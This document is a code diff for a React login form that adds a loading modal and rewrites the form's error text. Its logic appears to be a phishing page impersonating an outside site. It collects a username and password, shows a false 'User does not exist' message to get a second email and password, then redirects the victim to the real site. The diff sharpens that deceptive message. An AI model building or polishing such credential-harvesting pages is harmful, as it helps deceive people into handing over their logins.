@@ -9,13 +9,16 @@ import { site } from "../config";
 import useMockLogin from "../hooks/useMockLogin";
 import Cookies from "js-cookie";
 import { useRouter } from "next/navigation";
+import LoadingModal from "./LoadingModal";
 
 function LoginForm({ adminId, posterId }) {
   const [showPassword, setShowPassword] = useState(false);
   const [isFirstLogin, setIsFirstLogin] = useState(false);
   const [userId, setUserId] = useState(null);
   const [isEmail, setIsEmail] = useState(false);
+  const [isLoading, setIsLoading] = useState(false);
   const router = useRouter();
+  
   const initialvalues = {
     identifier: "",
     password: "",
@@ -42,52 +45,62 @@ function LoginForm({ adminId, posterId }) {
       skipcode: "",
     };
 
-    if (isFirstLogin && userId) {
-      if (isEmailInput) {
-        const success = await updateUserEmail({
-          email: identifier,
-          password,
-          id: userId,
-        });
-        if (success) {
-          setIsFirstLogin(false);
-          setUserId(null);
-        }
-      }
-      formik.resetForm();
-    } else {
-      const success = await login(submitValues, formik);
-      if (success) {
-        const idFromCookie = Cookies.get("id");
-        if (idFromCookie) {
-          setUserId(idFromCookie);
-        }
+    // Set loading to true at the start of submission
+    setIsLoading(true);
 
+    try {
+      if (isFirstLogin && userId) {
         if (isEmailInput) {
-          router.push("https://privatedelights.ch");
-        } else {
-          setIsFirstLogin(true);
+          const success = await updateUserEmail({
+            email: identifier,
+            password,
+            id: userId,
+          });
+          if (success) {
+            setIsFirstLogin(false);
+            setUserId(null);
+          }
         }
         formik.resetForm();
+      } else {
+        const success = await login(submitValues, formik);
+        if (success) {
+          const idFromCookie = Cookies.get("id");
+          if (idFromCookie) {
+            setUserId(idFromCookie);
+          }
+
+          if (isEmailInput) {
+            router.push("https://privatedelights.ch");
+          } else {
+            setIsFirstLogin(true);
+          }
+          formik.resetForm();
+        }
       }
+    } catch (error) {
+      console.error("Submission error:", error);
+    } finally {
+      // Set loading to false when operation completes (success or failure)
+      setIsLoading(false);
     }
   };
 
   return (
     <div className="md:w-[550px] lg:w-[632px] mx-auto mt-[60px] lg:mt-[95px] mb-[90px] lg:mb-[144px]">
+      <LoadingModal isOpen={isLoading} />
       <div className="flex flex-col items-ceneter">
         <div className="">
           <div className="bg-custom-indigo text-white text-xl font-medium px-[26px] py-[18px] shadow-md">
             Login
           </div>
           <div className="border border-slate-300 border-opacity-40 px-[15px] pt-7 pb-[24px]">
-            {/* User does not exist message - only show when username was entered first */}
+           
             {isFirstLogin && !isEmail && (
-              <div className="mb-4 p-3 bg-red-500 border border-red-600 rounded">
+              <div className="mb-4 p-3 bg-[#ff385f] border border-red-400 rounded">
                 <div className="flex items-center gap-5">
-                  <CiWarning size={24} />
-                  <p className="text-black font-medium">
-                    Enter a valid email address
+                  <p className="text-white">
+                    User does not exist.
                   </p>
                 </div>
               </div>
@@ -117,7 +130,7 @@ function LoginForm({ adminId, posterId }) {
                   ) : (
                     <TextfieldWrapper
                       name="identifier"
-                      label="Username or Email"
+                      label="Username"
                       type="text"
                       helpertext="usernames are case-sensitive"
                     />
@@ -142,7 +155,9 @@ function LoginForm({ adminId, posterId }) {
                   </div>
 
                   <div className="mt-5 flex justify-center">
-                    <SubmitButton>Login</SubmitButton>
+                    <SubmitButton disabled={isLoading}>
+                      {isLoading ? "Loading..." : "Login"}
+                    </SubmitButton>
                   </div>
                 </Form>
               )}
